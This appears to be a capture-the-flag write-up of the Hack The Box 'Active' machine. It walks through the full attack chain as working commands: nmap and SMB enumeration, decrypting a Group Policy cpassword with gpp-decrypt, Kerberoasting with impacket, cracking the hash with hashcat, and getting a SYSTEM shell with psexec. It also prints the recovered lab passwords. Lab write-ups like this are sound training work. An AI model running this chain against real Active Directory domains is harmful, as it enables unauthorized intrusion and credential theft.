# Active [HTB](https://app.hackthebox.com/machines/148)
![active-01]()


## Recon

After adding the target to my `/etc/hosts` file I start scanning for open ports:

```bash
nmap -p- --min-rate 10000 active.htb
```

![ports-02]()


There were also rpc related ports at the buttom, but the above ports are the most relevant. Let's run a version detection scan on them:

```bash
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389 -sCV active.htb -oN nmap.result
```

![nmap-res-03]()

![nmap-res-04]()


We have the following:

+ A DNS server on port 53.
+ The Kerberos service on ports 88, 464.
+ An rpc endpoint-mapper on port 135.
+ NetBIOS on port 139.
+ LDAP services on ports 389, 3268.
+ An SMB server on port 445.
+ Other rpc related services at ports 593, 5722.
+ A tcpwrapper service on ports 636, 3269.
+ Message Farming on port 9389.


We can probably make an educated guess that we are dealing with an Active-Directory domain controller based on the services we see available on the system (DNS, LDAP, Kerberos, etc). We can also conclude that the target domain is `active.htb`, the target OS is probably a 2008 Windows R2 server, and that message singing is enabled and required. 


The fact that RPC and SMB are enabled on the target opens up unique possibilities for domain specific reconnaissance, which can open up vast attack vectors againts the domain. 


Let's begin!


### RPC & SMB Ports 135, 139, 445


At first I try to connect to the target's rpc with a null session:

```bash
rpcclient -U "" -N active.htb 
```

This works, and we get a connection, but trying to enumerate the domain with commands like `enumdomusers` and `enumdomgroups` fails with insufficient privileges. 


Then I ran different tools like `crackmapexec` and `ldapsearch` as well as `enum4linux`. They didn't bring super useful results but `enum4linux -a active.htb` did manage to map the SMB shares on the target:

![smb-shares-05]()


The available shares are highlighed in red at the top. Out of all the shares we can connect and list the contents of the `Replication` share.


If we connect to this share and list it's contents, we will see a `active.htb` directory. I copied this directory recursively using the following set of commands:


```bash
smbclient -N \\\\active.htb\\Replication
smb: \> prompt
smb: \> recurse
smb: \> mget active.htb
```

![mget-06]()


If we list the contents of this directory with `tree active.htb` we can see the following:

![tree-07]()


Looks like we have two group policy objects in here, let's take a look at the files. 


+ `{6AC1786C-016F-11D2-945F-00C04fB984F9}`


This is the group policy you can see near the buttom of the `tree` output. It has mainly two files, `GPT.INI` and `GptTmpl.inf`. None of these files are super useful in getting access to the system. 


+ `{31B2F340-016D-11D2-945F-00C04FB984F9}`

This is the group policy you see near the top of the `tree` output. Here we have five files, `GPT.INI` and `GPE.INI` are not super important. Then there is the `GptTmpl.inf` file, which holds some password policy information like max password age, length, complexity, etc. As well as some kerberos policies. This is more intersting, but not super useful at the moment. 


However, then we have the `Groups.xml` file, and this is where things get really interesting. 


The file reads as such:

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```


We can see the domain's `Ticket Granting Service` service account, along with it's AES encrypted password.

We can try to decrypt the password on our Kali machine as such:

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

![decrypt-08]()


The password for the service account is `GPPstillStandingStrong2k18`, and now we have credentials to work with. This opens up a lot of active directory specific attacks, like [kerberosting](https://www.sentinelone.com/cybersecurity-101/what-is-kerberoasting-attack/). 


To find kerberostable user accounts we can use the recently found credentials with impacket's `GetUserSPNs` tool as such:

```bash
impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip active.htb -request
```

![kerberoast-09]()


Which results in the Administrator's account no less!  


Let's save the entire thing to a file and try to crack it with `hashcat` as such:

```bash
hashcat -m 13100 admin.hash rockyou.txt
```

![cracked-10]()


I use my host GPU for the computation, which cracks after one second to `Ticketmaster1968`, from here I immediately go for psexec to give myself a shell as NT_Authority on this box:

```bash
impacket-psexec active.htb/Administrator:Ticketmaster1968@active.htb
```

![root-11]()
